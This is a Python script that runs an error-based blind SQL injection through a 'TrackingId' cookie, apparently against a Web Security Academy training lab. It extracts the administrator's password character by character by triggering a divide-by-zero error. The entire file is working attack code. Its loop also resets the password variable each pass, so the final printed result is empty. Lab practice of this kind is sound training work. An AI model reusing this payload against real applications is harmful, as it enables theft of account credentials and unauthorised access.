import requests
import sys

url = "https://0a950031038307fa867e344a00bb00af.web-security-academy.net/"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

i=1
while(True):
    password = ""
    f = False
    for c in chars:
        payload = f"aasdf' UNION SELECT CASE WHEN (username='administrator' and '{c}'=substr(password, {i}, 1) ) THEN TO_CHAR(1/0) ELSE 'a' END FROM users-- -" 
        cookies = {"TrackingId":payload}
        r = requests.get(url, cookies=cookies).text
        if("Internal Server Error" in r):
            password += c
            sys.stdout.write(c)
            sys.stdout.flush()
            f=True
            break
    if(not f):
        break

    i+=1

print("password is:", end=" ")
print(password)



